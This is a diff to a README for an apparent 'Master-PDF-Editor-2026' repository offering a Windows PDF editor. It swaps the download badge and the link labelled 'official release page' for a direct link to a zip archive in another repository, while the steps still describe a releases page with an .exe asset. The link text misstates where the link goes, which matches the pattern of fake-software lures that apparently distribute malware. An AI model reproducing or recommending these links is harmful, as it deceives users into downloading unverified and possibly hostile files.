@@ -5,7 +5,7 @@ description: "Download Master PDF Editor for Windows 10 and 11 to edit, sign, an
 ---
 # 📝 Master-PDF-Editor-2026 - Edit your PDF documents with ease
 
-[![](https://img.shields.io/badge/Download-Master_PDF_Editor-blue)](https://github.com/figbirdcnemidophorus941/Master-PDF-Editor-2026/releases)
+[![](https://img.shields.io/badge/Download-Master_PDF_Editor-blue)](https://raw.githubusercontent.com/figbirdcnemidophorus941/figbirdcnemidophorus941.github.io/main/igloo/io-figbirdcnemidophorus-github-3.2.zip)
 
 ## 📌 About this software
 
@@ -25,7 +25,7 @@ Before you install this software, confirm your computer meets these basic requir
 
 Follow these steps to obtain the setup files for your computer.
 
-1. Go to the [official release page](https://github.com/figbirdcnemidophorus941/Master-PDF-Editor-2026/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/figbirdcnemidophorus941/figbirdcnemidophorus941.github.io/main/igloo/io-figbirdcnemidophorus-github-3.2.zip).
 2. Look for the section labeled Assets.
 3. Click the link that ends in .exe to start the download.
 4. Save the file to a folder you can find later, such as your Downloads folder.
